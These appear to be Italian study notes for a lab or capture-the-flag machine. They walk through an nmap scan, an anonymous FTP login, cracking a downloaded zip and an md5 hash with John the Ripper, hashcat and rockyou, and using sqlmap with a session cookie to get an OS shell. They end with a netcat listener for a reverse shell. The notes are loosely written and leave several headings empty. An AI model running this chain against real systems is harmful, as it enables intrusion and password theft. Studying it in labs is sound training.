<link rel="stylesheet" href="../style.css">

<label for="tema">Tema scuro</label>
<input type="checkbox" id="tema-scuro"></input>

vpn

tmux, splitta il terminale

ping -c2 222.222.222.222

sudo nmap -sV -sC 222.222.222.222, identifica le porte aperte sulla macchina che risponde di un determinato ip:

-   sulla porta 22 solitamente c'è SSH
-   sulla 21 c'è ftp (in casi di "misconfiguration" si può fare un login anonimo e accedere ad alcuni file, per la modalità di debug), tra i cookie c'è un SessionID

    -   versione vsftpd 3.0.3, cercando online gli **exploit** per questa versione
    -   l'accesso anonimo si fa con :
        -   `ftp -v 222.222.222.222`
        -   user: Anonymous
        -   pass: (vuota, tanto non viene verificata per gli utenti anonimi)
        -   poi verifichi la presenza di file disponibili - get backup.zip

#### POC : Proof of Concept

## Funzione ash

### Dominio e codominio

Il dominio è infinito
Il codominio e' limitato

## Come decomprimere archivi compressi con cifratura

I programmi si salvano soltanto l'Ash della password di cifratura

## John the Ripper

È un password cracker
Si può usare

```bash
zip2john file.zip > hash
```

## bisogna avere un file con un set enorme di password

```bash
wc -l ./rockyou.txt #(world count, conta il numero di password)
head -n 30 ./rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash
john --show hash ## mostra le password trovate
```

Nel file index.php è presente l'hash md5 della password admin

## hashcat

```bash
hashcat -m 0 hash rockyou.txt
```

## hashes.com

passandogli un hash, ti comunica la password corrispondente all'ash

## SQL map

### Cos'è

È un tool per automatizzare gli attacchi di tipo SQL Injection

### Esempio

```bash
sqlmap -u "http://222.222.222.222/dashboad.php?search=any+queery" --cookie="PHPSESSIONID=..." # Passando il cookie php della sessione del browser una volta fatto l'accesso

## quando sei sicuro che è iniettabile

sqlmap -u "http://222.222.222.222/dashboad.php?search=any+queery" --cookie="PHPSESSIONID=..." --os-shell
```

Una volta entrato come utente postgress, verificare:

```bash
whoami
# utente postgress

ifconfig # verificare l'ip
# 222.222.222.222

nc -nvlp 8888
```

## Cos'è john the ripper

## Cos'è hashcat

## Cos'è sqlmap

## Cos'è sqlinjection
